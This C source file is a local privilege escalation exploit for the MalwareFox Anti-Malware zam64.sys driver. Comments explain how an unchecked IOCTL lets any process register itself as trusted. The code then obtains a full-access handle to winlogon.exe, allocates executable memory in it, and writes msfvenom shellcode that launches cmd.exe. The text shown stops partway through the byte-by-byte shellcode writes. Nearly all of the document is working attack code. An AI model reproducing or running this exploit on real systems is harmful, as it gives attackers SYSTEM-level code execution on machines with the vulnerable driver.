#include "stdafx.h"
#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>

BOOL RegisterProcessByIOCTL(HANDLE hDevice)
{
	DWORD pid, BytesReturned;

	/*
	IOCTL 0x80002010 registers a process, by its PID, as trusted by the driver. Registered
	processes can send special IOCTLs to the driver to do stuff like:
	- Enable/Disable real-time protection
	- Write to raw disk
	- Open full access handles to processes
	- ...etc

	When a process sends a special IOCTL, the driver checks if that process is registered (as
	shown in the disassembly below at address 0000000140010573).
	However, when a process sends the IOCTL 0x80002010 to register a process by its PID, the driver
	doesn't check to see if the requestor itself is registered (0000000140010553).
	That way, any process can register any other process (including itself) with the driver.

	.text:000000014001054A                 mov     ebx, [rcx+_IO_STACK_LOCATION.Parameters.DeviceIoControl.IoControlCode]
	.text:000000014001054D                 cmp     ebx, 80002010h
	.text:0000000140010553                 jz      short find_ioctl_dispatcher ;jump past the check

	[......]

	.text:0000000140010573                 mov     edx, 1
	.text:0000000140010578                 mov     ecx, ebp ; Requestor_PID
	.text:000000014001057A                 call    IsProcessRegistered
	.text:000000014001057F                 lea     rdx, aMain_c
	.text:0000000140010586                 test    eax, eax
	.text:0000000140010588                 jnz     short loc_1400105C2
	.text:000000014001058A                 mov     [rsp+68h+var_38], ebp
	.text:000000014001058E                 lea     rax, aProcessidDIsNo
	.text:0000000140010595                 mov     edi, STATUS_ACCESS_DENIED

	[......]

	.text:00000001400105C8 find_ioctl_dispatcher:                  ; CODE XREF: sub_1400104BC+97j
	.text:00000001400105C8                                         ; sub_1400104BC+ACj

	[......]

	.text:0000000140010612                 cmp     ebx, 80002010h
	.text:0000000140010618                 jz      loc_1400106D7  ; dispatch the IOCTL
	*/

	pid = GetCurrentProcessId(); //Register our process with the driver
	if (!DeviceIoControl(hDevice, 0x80002010, &pid, sizeof(DWORD), NULL, 0, &BytesReturned, NULL))
	{
		return FALSE;
	}

	return TRUE;
}

DWORD GetWinlogonPID()
{
	DWORD WinlogonPid = 0;
	PROCESSENTRY32 ProcessEntry;
	ProcessEntry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("[-] CreateToolhelp32Snapshot failed !\n");
		goto ret;
	}

	if (!Process32First(hSnapshot, &ProcessEntry))
	{
		printf("[-] Process32First failed !\n");
		goto cleanup;
	}

	do
	{
		if (!lstrcmp(ProcessEntry.szExeFile, L"winlogon.exe"))
		{
			WinlogonPid = ProcessEntry.th32ProcessID;
			break;
		}
	} while (Process32Next(hSnapshot, &ProcessEntry));

cleanup:
	CloseHandle(hSnapshot);
ret:
	return WinlogonPid;
}
int main(int argc, char** argv)
{
	DWORD BytesReturned;
	DWORD winlogon_pid;
	HANDLE winlogon_handle;
	LPVOID RemoteAllocation;
	HANDLE hDevice;

	printf("===      MalwareFox Anti-Malware 2.74.0.150 zam64.sys Local Privilege Escalation      ===\n");
	printf("                              Tested on Windows 10 64-bit                                \n");
	printf("                                   Souhail Hammou                                      \n\n");
	printf("[*] Stage 1: Registering the process with the driver by sending IOCTL 0x80002010\n");

	hDevice = CreateFile
	(L"\\\\.\\ZemanaAntiMalware",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		return 0;
	}


	if (!RegisterProcessByIOCTL(hDevice))
	{
		printf("\t[-] Registration Failed !\n");
		return 0;
	}

	printf("\t[+] Process registered.\n[*] Stage 2: \n");

	printf("\t[+] Getting Winlogon's PID\n");
	winlogon_pid = GetWinlogonPID();

	if (!winlogon_pid)
	{
		printf("\t[-] GetWinlogonPID() failed !\n");
		return 0;
	}

	printf("\t[+] (IOCTL) Opening a full access, user-mode accessible handle from kernel-mode to winlogon\n");

	/*
	The dispatcher for IOCTL code 0x8000204C opens a full access handle, accessible from usermode, to a process.
	We use this IOCTL to open a full access handle to winlogon.exe.
	Note that this IOCTL can only be sent if the process is registered with the driver.
	*/
	if (!DeviceIoControl(hDevice, 0x8000204C, &winlogon_pid, sizeof(DWORD), &winlogon_handle, sizeof(HANDLE), &BytesReturned, NULL))
	{
		printf("\t[-] DeviceIoControl 0x8000204C failed !\n");
		return 0;
	}

	printf("\t[+] Allocating executable memory in winlogon.exe using the full access handle\n");

	if (!(RemoteAllocation = VirtualAllocEx(winlogon_handle, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)))
	{
		printf("\t[-] VirtualAllocEx failed !\n");
		return 0;
	}

	printf("\t[+] Writing shellcode to allocated memory\n");

	/*msfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=thread -f c*/
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 0), "\xfc", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 1), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 2), "\x83", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 3), "\xe4", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 4), "\xf0", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 5), "\xe8", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 6), "\xc0", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 7), "\x00", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 8), "\x00", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 9), "\x00", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 10), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 11), "\x51", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 12), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 13), "\x50", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 14), "\x52", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 15), "\x51", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 16), "\x56", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 17), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 18), "\x31", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 19), "\xd2", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 20), "\x65", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 21), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 22), "\x8b", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 23), "\x52", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 24), "\x60", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 25), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 26), "\x8b", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 27), "\x52", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 28), "\x18", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 29), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 30), "\x8b", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 31), "\x52", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 32), "\x20", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 33), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 34), "\x8b", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 35), "\x72", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 36), "\x50", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 37), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 38), "\x0f", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 39), "\xb7", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 40), "\x4a", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 41), "\x4a", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 42), "\x4d", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 43), "\x31", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 44), "\xc9", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 45), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 46), "\x31", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 47), "\xc0", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 48), "\xac", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 49), "\x3c", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 50), "\x61", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 51), "\x7c", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 52), "\x02", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 53), "\x2c", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 54), "\x20", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 55), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 56), "\xc1", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 57), "\xc9", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 58), "\x0d", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 59), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 60), "\x01", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 61), "\xc1", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 62), "\xe2", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 63), "\xed", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 64), "\x52", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 65), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 66), "\x51", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 67), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 68), "\x8b", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 69), "\x52", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 70), "\x20", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 71), "\x8b", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 72), "\x42", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 73), "\x3c", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 74), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 75), "\x01", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 76), "\xd0", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 77), "\x8b", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 78), "\x80", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 79), "\x88", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 80), "\x00", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 81), "\x00", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 82), "\x00", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 83), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 84), "\x85", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 85), "\xc0", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 86), "\x74", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 87), "\x67", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 88), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 89), "\x01", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 90), "\xd0", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 91), "\x50", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 92), "\x8b", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 93), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 94), "\x18", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 95), "\x44", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 96), "\x8b", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 97), "\x40", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 98), "\x20", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 99), "\x49", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 100), "\x01", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 101), "\xd0", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 102), "\xe3", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 103), "\x56", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 104), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 105), "\xff", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 106), "\xc9", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 107), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 108), "\x8b", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 109), "\x34", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 110), "\x88", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 111), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 112), "\x01", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 113), "\xd6", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 114), "\x4d", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 115), "\x31", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 116), "\xc9", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 117), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 118), "\x31", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 119), "\xc0", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 120), "\xac", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 121), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 122), "\xc1", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 123), "\xc9", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 124), "\x0d", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 125), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 126), "\x01", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 127), "\xc1", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 128), "\x38", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 129), "\xe0", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 130), "\x75", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 131), "\xf1", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 132), "\x4c", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 133), "\x03", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 134), "\x4c", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 135), "\x24", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 136), "\x08", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 137), "\x45", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 138), "\x39", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 139), "\xd1", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 140), "\x75", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 141), "\xd8", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 142), "\x58", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 143), "\x44", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 144), "\x8b", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 145), "\x40", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 146), "\x24", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 147), "\x49", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 148), "\x01", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 149), "\xd0", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 150), "\x66", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 151), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 152), "\x8b", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 153), "\x0c", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 154), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 155), "\x44", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 156), "\x8b", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 157), "\x40", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 158), "\x1c", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 159), "\x49", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 160), "\x01", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 161), "\xd0", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 162), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 163), "\x8b", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 164), "\x04", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 165), "\x88", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 166), "\x48", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 167), "\x01", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 168), "\xd0", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 169), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 170), "\x58", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 171), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 172), "\x58", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 173), "\x5e", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 174), "\x59", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 175), "\x5a", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 176), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 177), "\x58", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 178), "\x41", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 179), "\x59", 1, (SIZE_T *)&BytesReturned);
	WriteProcessMemory(winlogon_handle, (LPVOID *)((char *)RemoteAllocation + 180), "\x41", 1, (SIZE_T *)&BytesReturned);
